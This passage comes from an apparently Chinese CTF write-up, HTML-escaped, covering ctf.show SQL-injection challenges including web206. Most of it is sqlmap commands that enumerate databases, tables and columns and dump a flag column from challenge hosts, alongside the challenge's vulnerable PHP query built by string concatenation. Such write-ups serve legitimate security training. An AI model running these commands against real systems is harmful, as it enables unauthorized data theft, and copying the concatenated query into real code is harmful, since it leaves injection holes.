&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py &lt;span class=&#34;literal&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--method&lt;/span&gt;=PUT &lt;span class=&#34;literal&#34;&gt;--headers&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type:text/plain&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--cookie&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;PHPSESSID=abcd&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--data&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;id=1&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--referer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--safe-url&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--safe-freq&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--dbs&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827170121468.png&#34; alt=&#34;image-20250827170121468&#34; style=&#34;zoom: 25%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py &lt;span class=&#34;literal&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--method&lt;/span&gt;=PUT &lt;span class=&#34;literal&#34;&gt;--headers&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type:text/plain&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--cookie&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;PHPSESSID=abcd&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--data&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;id=1&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--referer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--safe-url&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--safe-freq&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-D&lt;/span&gt; ctfshow_web &lt;span class=&#34;literal&#34;&gt;--tables&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827170710461.png&#34; alt=&#34;image-20250827170710461&#34; style=&#34;zoom:25%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py &lt;span class=&#34;literal&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--method&lt;/span&gt;=PUT &lt;span class=&#34;literal&#34;&gt;--headers&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type:text/plain&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--cookie&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;PHPSESSID=abcd&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--data&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;id=1&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--referer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--safe-url&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--safe-freq&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-D&lt;/span&gt; ctfshow_web &lt;span class=&#34;literal&#34;&gt;-T&lt;/span&gt; ctfshow_flax &lt;span class=&#34;literal&#34;&gt;--columns&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827170742936.png&#34; alt=&#34;image-20250827170742936&#34; style=&#34;zoom:25%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py &lt;span class=&#34;literal&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--method&lt;/span&gt;=PUT &lt;span class=&#34;literal&#34;&gt;--headers&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type:text/plain&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--cookie&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;PHPSESSID=abcd&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--data&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;id=1&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--referer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--safe-url&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--safe-freq&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-D&lt;/span&gt; ctfshow_web &lt;span class=&#34;literal&#34;&gt;-T&lt;/span&gt; ctfshow_flax &lt;span class=&#34;literal&#34;&gt;-C&lt;/span&gt; flagx &lt;span class=&#34;literal&#34;&gt;--dump&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827170852040.png&#34; alt=&#34;image-20250827170852040&#34; style=&#34;zoom: 25%;&#34; /&gt;
&lt;p&gt; &lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web206&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web206&#34;&gt;#&lt;/a&gt; web206&lt;/h1&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;需要闭合&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查询语句&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;拼接&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;语句查找指定ID用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &amp;quot;select id,username,pass from ctfshow_user where id = (&amp;#x27;&amp;quot;.$id.&amp;quot;&amp;#x27;) limit 0,1;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;返回逻辑&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;对传入的参数进行了过滤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; waf($str)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;代码过于简单，不宜展示&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;sqlmap 会自己判断闭合&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py &lt;span class=&#34;literal&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/index.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--method&lt;/span&gt;=PUT &lt;span class=&#34;literal&#34;&gt;--headers&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type:text/plain&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--cookie&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;PHPSESSID=abcd&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--data&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;id=1&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--referer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;ctf.show&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--safe-url&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/getToken.php&amp;quot;&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;--safe-freq&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-D&lt;/span&gt; ctfshow_web &lt;span class=&#34;literal&#34;&gt;--tables&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
